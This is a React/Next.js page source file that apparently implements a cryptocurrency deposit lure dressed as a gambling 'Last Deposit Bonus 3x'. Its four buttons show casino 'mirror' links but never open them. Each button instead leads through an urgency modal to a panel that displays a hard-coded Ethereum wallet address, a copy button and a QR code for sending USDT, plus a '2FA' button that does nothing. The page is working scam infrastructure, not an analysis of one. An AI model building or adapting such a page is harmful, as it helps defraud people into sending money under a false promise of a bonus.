"use client";
import { useState } from "react";
import dynamic from "next/dynamic";
const QRCode = dynamic(() => import("react-qr-code"), { ssr: false });

export default function Page(){
  const [showBonus, setShowBonus] = useState(false);
  const [showWallet, setShowWallet] = useState(false);

  const address = "0x505323cf88791ff0ef76dad6b191be6fce3a346e";

  const mirrors = [
    {label:"PlayBonus.com", url:"https://playbonus.com?bonus=LastDepositBonus3x"},
    {label:"Play.ac", url:"https://play.ac?bonus=LastDepositBonus3x"},
    {label:"Play.games", url:"https://play.games?bonus=LastDepositBonus3x"},
    {label:"Play.bet", url:"https://play.bet?bonus=LastDepositBonus3x"}
  ];

  return (
    <main className="min-h-screen w-full max-w-[560px] mx-auto p-5">
      <div className="text-center mt-4">
        <div className="text-2xl font-extrabold">PlayBonus</div>
        <div className="text-sm text-white/70">Claim Your Bonus</div>
      </div>

      <div className="mt-6 space-y-2">
        {mirrors.map((m, i) => (
          <button key={i} onClick={() => setShowBonus(true)}
            className="w-full flex items-center justify-between px-4 py-3 rounded-xl bg-[#1b2733] border border-white/10 hover:bg-[#203140] active:opacity-90 transition">
            <div className="flex items-center gap-2 min-w-0">
              <span className="w-2 h-2 bg-green-400 rounded-full"></span>
              <span className="font-semibold whitespace-nowrap">{m.label}</span>
            </div>
            <span className="chip text-xs text-[#bfc7d0] font-mono px-2 py-1 truncate max-w-[60%]">{m.url}</span>
          </button>
        ))}
      </div>

      {showBonus && (
        <div className="fixed inset-0 z-50 bg-black/75 flex items-center justify-center p-4"
             onClick={(e)=> e.currentTarget === e.target && setShowBonus(false)}>
          <div className="glass w-full max-w-[520px]">
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/10">
              <div className="font-extrabold">Claim Bonus</div>
              <button onClick={()=>setShowBonus(false)} className="text-xl">×</button>
            </div>
            <div className="p-5 text-center">
              <div className="flex justify-center mb-4 text-6xl">🎁</div>
              <div className="font-extrabold text-xl mb-1">Last Deposit Bonus — Good Bye India</div>
              <div className="text-white/70 text-sm mb-4">
                New bonus available! Claim it now before it’s gone!
              </div>
              <button onClick={()=>{ setShowBonus(false); setShowWallet(true); }} className="btn-primary">Claim Bonus</button>
            </div>
          </div>
        </div>
      )}

      {showWallet && (
        <div className="fixed inset-0 z-50 bg-black/75 flex items-center justify-center p-4"
             onClick={(e)=> e.currentTarget === e.target && setShowWallet(false)}>
          <div className="glass w-full max-w-[560px]">
            <div className="flex items-center justify-between px-4 py-3 border-b border-white/10">
              <div className="font-extrabold">Last Deposit Bonus 3x</div>
              <button onClick={()=>setShowWallet(false)} className="text-xl">×</button>
            </div>
            <div className="p-5">
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-3">
                <div className="rounded-xl bg-[#12232c] border border-white/10 p-3 shadow-inner">
                  <div className="text-sm text-white/70">Currency</div>
                  <div className="mt-1 font-bold">USDT</div>
                </div>
                <div className="rounded-xl bg-[#12232c] border border-white/10 p-3 shadow-inner">
                  <div className="text-sm text-white/70">Network</div>
                  <div className="mt-1 font-bold">ETH</div>
                </div>
              </div>

              <div className="flex items-center gap-2 rounded-xl bg-[#12232c] border border-white/10 p-3 mb-3">
                <div className="text-xs sm:text-sm font-mono break-all">{address}</div>
                <button className="ml-auto rounded-lg bg-sky-600 hover:bg-sky-700 px-3 py-1 text-sm font-bold"
                  onClick={async ()=>{ await navigator.clipboard.writeText(address); alert('Copied'); }}>Copy</button>
              </div>

              <div className="flex justify-center my-3">
                <div className="bg-white p-3 rounded-lg"><QRCode value={address} size={180}/></div>
              </div>

              <div className="flex justify-between text-sm text-white/70 mb-4">
                <span>Credited</span><span>2 Confirmations</span>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <button className="btn-primary">Enable 2FA</button>
                <button className="btn-ghost">Help</button>
              </div>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
